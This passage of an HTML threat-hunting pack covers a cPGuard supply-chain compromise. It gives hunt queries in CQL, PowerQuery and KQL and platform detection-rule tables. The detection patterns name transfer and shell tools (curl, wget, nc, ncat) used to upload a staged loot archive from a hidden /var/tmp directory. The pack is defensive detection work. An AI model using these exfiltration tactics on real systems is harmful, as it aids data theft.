+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql6"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: An upload made from inside an already running interpreter, with the archive named only in a script file, is not captured.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: tgt.process.name holds the basename of the executed transfer tool.</li><li>KQL – Defender XDR: An upload made from inside an already running interpreter, with the archive named only in a script file, is not captured.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the archive path is Linux-specific.</li><li>KQL – Defender XDR assumes: FileName holds the basename of the executed transfer tool.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql6-tab" aria-controls="cql6-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery6-tab" aria-controls="powerquery6-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql6-tab" aria-controls="kql6-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql6-pane" role="tabpanel" aria-labelledby="cql6-tab"><pre class="cql" id="cql6"><span class="cm">// HUNT: Transfer tool referencing the cPGuard loot archive (upload to the licensing server)</span>
+<span class="cm">// MITRE: T1041, T1105</span>
+<span class="cm">// CONF: medium  FP: low  COST: low | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// NOTE: upload method and destination host are not published by any source</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| FileName=/^(curl|wget|php|perl|python[0-9.]*|ruby|scp|sftp|rsync|ftp|nc|ncat)$/i
+| CommandLine=/(loot\.tgz|\/var\/tmp\/\.cpg\d+)/i
+| table([@timestamp, ComputerName, aid, UserName, FileName, CommandLine, ParentBaseFileName, ImageFileName])</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery6-pane" role="tabpanel" aria-labelledby="powerquery6-tab" hidden><details class="rosetta-requirements"><summary>4 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.name</code>: Created process name</li><li><code>tgt.process.cmdline</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Creator process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.name = * tgt.process.cmdline = *
+| limit 5
+| columns event.time, endpoint.name, tgt.process.name, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery6" data-language="powerquery" data-rosetta-query-id="cql6">// HUNT: Transfer tool referencing the cPGuard loot archive (upload to the licensing server)
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1041, T1105
+// CONF: medium | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: a transfer tool or scripting runtime by created process name whose command line names loot.tgz or the hidden collection directory. matches and contains are case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: None expected; the upload method and destination host are not published by any source, so the command line is the only anchor.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: An upload made from inside an already running interpreter, with the archive named only in a script file, is not captured.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.name matches &#x27;^(curl|wget|php|perl|python[0-9.]*|ruby|scp|sftp|rsync|ftp|nc|ncat)$&#x27; (tgt.process.cmdline contains &#x27;loot.tgz&#x27; or tgt.process.cmdline matches &#x27;/var/tmp/\\.cpg\\d+&#x27;)
+| columns event.time, endpoint.name, agent.uuid, src.process.user, tgt.process.name, tgt.process.cmdline, src.process.name, tgt.process.image.path
+| sort -event.time
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql6-pane" role="tabpanel" aria-labelledby="kql6-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed (0 errors, 0 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>FileName</code>: Created process name</li><li><code>ProcessCommandLine</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Creator process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, FileName, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql6" data-language="kql" data-rosetta-query-id="cql6">// HUNT: Transfer tool referencing the cPGuard loot archive (upload to the licensing server)
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1041, T1105
+// CONF: medium | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: a transfer tool or scripting runtime by created process name whose command line names loot.tgz or the hidden collection directory. matches regex with (?i) and contains reproduce the CQL /i intent.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: None expected; the upload method and destination host are not published by any source, so the command line is the only anchor.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: An upload made from inside an already running interpreter, with the archive named only in a script file, is not captured.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where FileName matches regex @&quot;(?i)^(curl|wget|php|perl|python[0-9.]*|ruby|scp|sftp|rsync|ftp|nc|ncat)$&quot;
+| where ProcessCommandLine contains &quot;loot.tgz&quot; or ProcessCommandLine matches regex @&quot;(?i)/var/tmp/\.cpg\d+&quot;
+| project Timestamp, ReportId, DeviceId, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath
+| sort by Timestamp desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q7 &middot; DNS lookups for the licensing server (placeholder, inactive until filled)</span>
+        <div class="qc-badges"><span class="badge b-high">CONF LOW</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql7',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql7')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for DNS requests for the OPSSHIELD licensing server hostname the script uploaded to. <strong>No source publishes that hostname</strong>, so the pattern is the labelled placeholder <code>REPLACE_WITH_LICENSING_SERVER_DOMAIN</code> and the query matches nothing until you replace it with the hostname from your own cPGuard configuration or egress logs. Expect legitimate traffic to the same host from every cPGuard server, so the useful signal is volume and timing around 2026-11-02, not presence. <strong>FP:</strong> every healthy cPGuard server queries its licensing host.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql7"><div class="rosetta-release"><span class="rosetta-badge level">Validation: static-reviewed</span><span class="rosetta-badge">Equivalence: unsupported-without-redesign</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: The licensing server hostname is unpublished, so no SentinelOne lookup can be written for it.</li><li>KQL – Defender XDR: The licensing server hostname is unpublished, so no Defender lookup can be written for it.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql7-tab" aria-controls="cql7-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery7-tab" aria-controls="powerquery7-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql7-tab" aria-controls="kql7-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql7-pane" role="tabpanel" aria-labelledby="cql7-tab"><pre class="cql" id="cql7"><span class="cm">// HUNT: DNS lookups for the cPGuard licensing server (REPLACE_WITH_LICENSING_SERVER_DOMAIN)</span>
+<span class="cm">// MITRE: T1041</span>
+<span class="cm">// CONF: low  FP: medium  COST: low | REQUIRES: DNS lookup telemetry (DnsRequest)</span>
+<span class="cm">// FALSE POSITIVES: the legitimate licensing check that every cPGuard server performs</span>
+<span class="cm">// TUNING: set the search window to 2026-11-02 00:00 UTC onward and compare against the prior 30 days per host;</span>
+<span class="cm">//         the signal is a burst of lookups near the update times in install_log, not the lookup itself</span>
+<span class="cm">// NOTE: replace the placeholder with the hostname from your own configuration; no source publishes it</span>
+#event_simpleName=DnsRequest
+| event_platform=Lin
+| DomainName=/REPLACE_WITH_LICENSING_SERVER_DOMAIN/i
+| groupBy([aid, ComputerName], function=[count(as=lookups), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen)])
+| sort(lookups, order=desc, limit=200)</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery7-pane" role="tabpanel" aria-labelledby="powerquery7-tab" hidden><details class="rosetta-requirements"><summary>1 required field · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DNS Resolved</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;DNS Resolved&#x27;
+| limit 5
+| columns event.type</pre></section></div></details><pre class="siem-code powerquery" id="powerquery7" data-language="powerquery" data-rosetta-query-id="cql7">// HUNT: DNS lookups for the cPGuard licensing server (REPLACE_WITH_LICENSING_SERVER_DOMAIN)
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1041
+// CONF: low | FP: medium
+// FALSE POSITIVES: the legitimate licensing check that every cPGuard server performs
+// EQUIVALENCE: unsupported-without-redesign - The CQL is an inactive placeholder: its domain filter is an unfilled token that no source publishes, so any translation would carry the same empty token and hunt nothing. It also depends on per-process DNS lookup telemetry that needs separate field verification on the tenant.
+// REQUIRES: The licensing server hostname from your own cPGuard configuration, plus DNS Resolved telemetry
+// TUNING: Fill the hostname on the CQL tab first; then port the filled query.
+// LOOKBACK: 7d on the CQL tab
+// CONFIGURATION: Use the CQL tab for this card.
+// KNOWN GAPS: The licensing server hostname is unpublished, so no SentinelOne lookup can be written for it.
+// VALIDATION LEVEL: static-reviewed</pre></div><div class="rosetta-pane" data-lang="kql" id="kql7-pane" role="tabpanel" aria-labelledby="kql7-tab" hidden><details class="rosetta-requirements"><summary>1 required field · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql7" data-language="kql" data-rosetta-query-id="cql7">// HUNT: DNS lookups for the cPGuard licensing server (REPLACE_WITH_LICENSING_SERVER_DOMAIN)
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1041
+// CONF: low | FP: medium
+// FALSE POSITIVES: the legitimate licensing check that every cPGuard server performs
+// EQUIVALENCE: unsupported-without-redesign - The CQL is an inactive placeholder: its domain filter is an unfilled token that no source publishes, so any translation would carry the same empty token and hunt nothing.
+// REQUIRES: The licensing server hostname from your own cPGuard configuration, plus DNS lookup telemetry
+// TUNING: Fill the hostname on the CQL tab first; then port the filled query.
+// LOOKBACK: 7d on the CQL tab
+// CONFIGURATION: Use the CQL tab for this card.
+// KNOWN GAPS: The licensing server hostname is unpublished, so no Defender lookup can be written for it.
+// VALIDATION LEVEL: static-reviewed</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q8 &middot; cPGuard update activity inventory since 2026-11-02 (exposure scoping)</span>
+        <div class="qc-badges"><span class="badge b-high">CONF LOW</span><span class="badge b-high">FP HIGH</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql8',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql8')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Lists hosts where a process with a cPGuard updater command line ran since the compromise started, to scope which servers to check with the install_log test in Section 7. It does not show the installed version and it does not show that the malicious script ran; the vendor's <code>install_log</code> is the authority. Set the search window to start at 2026-11-02 02:00 UTC. <strong>FP:</strong> every normal cPGuard update, so treat it as a scoping list, not a detection.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql8"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: any() returns one sample command line per host, not the ten the CQL collects.</li><li>PowerQuery: Every legitimate cPGuard update and version check also matches.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: Updater process names are not published, so the match is on the command line only.</li><li>KQL – Defender XDR: Every legitimate cPGuard update and version check also matches.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the cPGuard paths are Linux-specific.</li><li>KQL – Defender XDR assumes: Updater process names are not published, so the match is on the command line only.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql8-tab" aria-controls="cql8-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery8-tab" aria-controls="powerquery8-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql8-tab" aria-controls="kql8-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql8-pane" role="tabpanel" aria-labelledby="cql8-tab"><pre class="cql" id="cql8"><span class="cm">// HUNT: cPGuard update activity per host since 2026-11-02 (scoping list, not a detection)</span>
+<span class="cm">// MITRE: T1195.002</span>
+<span class="cm">// CONF: low  FP: high  COST: low | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// FALSE POSITIVES: all legitimate cPGuard updates and version checks</span>
+<span class="cm">// TUNING: this is a scoping list; confirm each host with the install_log check in Section 7 before acting</span>
+<span class="cm">// NOTE: set the search window to start 2026-11-02 02:00 UTC; updater process names are not published, so match on command line</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| CommandLine=/(cpgcli|\/opt\/cpguard\/)/i
+| CommandLine=/update/i
+| groupBy([aid, ComputerName], function=[count(as=updateRuns), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen), collect([CommandLine], limit=10)])
+| sort(updateRuns, order=desc, limit=500)</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery8-pane" role="tabpanel" aria-labelledby="powerquery8-tab" hidden><details class="rosetta-requirements"><summary>5 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.cmdline</code>: Created command line</li><li><code>agent.uuid</code>: Endpoint identifier</li><li><code>event.time</code>: Event time</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>endpoint.name</code>: Host name</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline = *
+| limit 5
+| columns event.time, agent.uuid, endpoint.name, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery8" data-language="powerquery" data-rosetta-query-id="cql8">// HUNT: cPGuard update activity per host since 2026-11-02 (scoping list, not a detection)
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1195.002
+// CONF: low | FP: high
+// FALSE POSITIVES: all legitimate cPGuard updates and version checks
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same scoping predicate and per-host aggregation: command lines naming cpgcli or the /opt/cpguard/ path that also contain update, counted per endpoint. matches and contains are case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: This is a scoping list, not a detection; confirm each host with the install_log check in the pack before acting. Set the console time picker to start at 2026-11-02 02:00 UTC.
+// LOOKBACK: 7d; set the console time picker to start 2026-11-02 02:00 UTC
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: any() returns one sample command line per host, not the ten the CQL collects. Every legitimate cPGuard update and version check also matches.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline matches &#x27;cpgcli|/opt/cpguard/&#x27; tgt.process.cmdline contains &#x27;update&#x27;
+| group update_runs=count(), first_seen=min(event.time), last_seen=max(event.time), sample_cmdline=any(tgt.process.cmdline) by agent.uuid, endpoint.name
+| sort -update_runs
+| limit 500</pre></div><div class="rosetta-pane" data-lang="kql" id="kql8-pane" role="tabpanel" aria-labelledby="kql8-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed-with-warnings (0 errors, 1 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>ProcessCommandLine</code>: Created command line</li><li><code>DeviceId</code>: Device identifier</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>DeviceName</code>: Device name</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, DeviceId, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql8" data-language="kql" data-rosetta-query-id="cql8">// HUNT: cPGuard update activity per host since 2026-11-02 (scoping list, not a detection)
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1195.002
+// CONF: low | FP: high
+// FALSE POSITIVES: all legitimate cPGuard updates and version checks
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same scoping predicate and per-host aggregation: command lines naming cpgcli or the /opt/cpguard/ path that also contain update, counted per device. matches regex with (?i) and contains reproduce the CQL /i intent.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: This is a scoping list, not a detection; confirm each host with the install_log check in the pack before acting.
+// LOOKBACK: 7d; narrow with LastSeen against 2026-11-02 02:00 UTC
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: Every legitimate cPGuard update and version check also matches.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed-with-warnings; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where ProcessCommandLine matches regex @&quot;(?i)(cpgcli|/opt/cpguard/)&quot;
+| where ProcessCommandLine contains &quot;update&quot;
+| summarize UpdateRuns = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), CommandLines = make_set(ProcessCommandLine, 10) by DeviceId, DeviceName
+| sort by UpdateRuns desc
+| take 500</pre></div></div>
+      </div>
+    </div>
+    </div>
+  </div>
+
+  <div class="section" id="s9">
+    <div class="section-hdr"><span class="snum">09</span><h2 data-rosetta-original="CrowdStrike Custom IOA Recommendations">Detection Rules by Platform</h2></div>
+    <div class="section-body">
+<p>Three queries are exact enough to promote. All ship as detect only. The names come from a vendor advisory, but the hidden-path and script checks are cheap and low-noise. cpgcli, <code>/opt/cpguard/</code> and the cPGuard binaries are legitimate product files and no IOA blocks or kills them.</p>
+
+<h3 data-rosetta-gen="ioa-heading" style="margin:4px 0 8px;font-size:13px">CrowdStrike: Custom IOA</h3><table>
+<tr><th>IOA name</th><th>Promotes</th><th>Pattern</th><th>Exclusions</th><th>Deployment Path</th></tr>
+<tr><td><code>DETECT-cPGuard-UpdateScriptExecution</code></td><td>Promote Q1</td><td>Linux process creation, command line matching <code>cpguard-v[0-9]+-i[0-9]+\.sh</code></td><td>None known</td><td>Custom IOA (process creation), severity High, action Detect only</td></tr>
+<tr><td><code>DETECT-cPGuard-HiddenBackdoorShell</code></td><td>Promote Q2</td><td>Linux process creation, image name <code>^\.cpg[0-9]+_sh$</code> or command line matching <code>/var/tmp/\.cpg[0-9]+</code></td><td>None known</td><td>Custom IOA (process creation), severity High, action Detect only</td></tr>
+<tr><td><code>DETECT-cPGuard-LootArchiveStaging</code></td><td>Promote Q5</td><td>Linux process creation, image name tar, gzip or zip, command line matching <code>loot\.tgz</code> or <code>/var/tmp/\.cpg[0-9]+</code></td><td>None known</td><td>Custom IOA (process creation), severity High, action Detect only</td></tr>
+</table>
+<p class="callout callout-warn">Do not promote Q3, Q4, Q6, Q7 or Q8. Q3 and Q4 fire on installers, backup and audit tools; Q6 depends on an unpublished upload method; Q7 is a placeholder; Q8 is a scoping list.</p>
+    
+<div data-rosetta-gen="rules"><h3 style="margin:18px 0 8px;font-size:13px">SentinelOne: custom detection rules</h3><table><thead><tr><th>Rule</th><th>Source query</th><th>Run as</th><th>Notes</th></tr></thead><tbody><tr><td>DETECT-cPGuard-UpdateScriptExecution</td><td>Q1, PowerQuery tab</td><td>Scheduled custom detection rule</td><td>Bind entities so the alert names the host instead of &quot;Unknown Device&quot;</td></tr><tr><td>DETECT-cPGuard-HiddenBackdoorShell</td><td>Q2, PowerQuery tab</td><td>Scheduled custom detection rule</td><td>Bind entities so the alert names the host instead of &quot;Unknown Device&quot;</td></tr><tr><td>DETECT-cPGuard-LootArchiveStaging</td><td>Q5, PowerQuery tab</td><td>Scheduled custom detection rule</td><td>Bind entities so the alert names the host instead of &quot;Unknown Device&quot;</td></tr></tbody></table><p>Create the rule with <code>POST /web/api/v2.1/cloud-detection/rules</code>, <code>queryType: "scheduled"</code> and <code>queryLang: "2.0"</code>, with the query in <code>data.scheduledParams.query</code>. Use 2.0 operator spellings: a rule written with the 1.0 token <code>ContainsCIS</code> was accepted and never fired on a tenant. The API does not warn, so lint the body before deploying.</p><h3 style="margin:18px 0 8px;font-size:13px">Microsoft Defender: custom detection rules</h3><table><thead><tr><th>Rule</th><th>Source query</th><th>Run as</th><th>Notes</th></tr></thead><tbody><tr><td>DETECT-cPGuard-UpdateScriptExecution</td><td>Q1, KQL – Defender XDR tab</td><td>Custom detection rule, alert only, every hour</td><td>The query returns Timestamp, ReportId and DeviceId, which Microsoft recommends for Defender for Endpoint tables so alerts carry the device group scope and the process tree. Remove the Timestamp filter and the final sort and take before saving the rule: the service applies the rule&#x27;s lookback itself</td></tr><tr><td>DETECT-cPGuard-HiddenBackdoorShell</td><td>Q2, KQL – Defender XDR tab</td><td>Custom detection rule, alert only, every hour</td><td>The query returns Timestamp, ReportId and DeviceId, which Microsoft recommends for Defender for Endpoint tables so alerts carry the device group scope and the process tree. Remove the Timestamp filter and the final sort and take before saving the rule: the service applies the rule&#x27;s lookback itself</td></tr><tr><td>DETECT-cPGuard-LootArchiveStaging</td><td>Q5, KQL – Defender XDR tab</td><td>Custom detection rule, alert only, every hour</td><td>The query returns Timestamp, ReportId and DeviceId, which Microsoft recommends for Defender for Endpoint tables so alerts carry the device group scope and the process tree. Remove the Timestamp filter and the final sort and take before saving the rule: the service applies the rule&#x27;s lookback itself</td></tr></tbody></table><p>Q3, Q4, Q6, Q7 and Q8 stay a hunt in this pack, not a rule. A rule can generate only 150 alerts per run. Continuous (NRT) frequency needs a single table and no comment lines, so delete the generated comment header from the query first.</p></div></div>
+  </div>
+
+  <div class="section" id="s10">
+    <div class="section-hdr"><span class="snum">10</span><h2>Machine-Readable IOC Appendix</h2></div>
+    <div class="section-body">
+<p>Grouped quick-copy blocks. The Falcon CSV ships <strong>three placeholders and no importable atomic rows</strong>: no source publishes a hash, IP address or malicious domain, so none is invented. Replace each <code>REPLACE_WITH_</code> value from your own preserved evidence before import, or delete the row. The four filesystem artifacts are not a Falcon IOC type, so they live in their own block and are hunted by Q1, Q2, Q3 and Q5. Nothing here is a prevent action: the artifacts are single-lineage (the vendor and its re-publisher) and cPGuard files are legitimate product files.</p>
+      <div class="ioc-grab-grid">
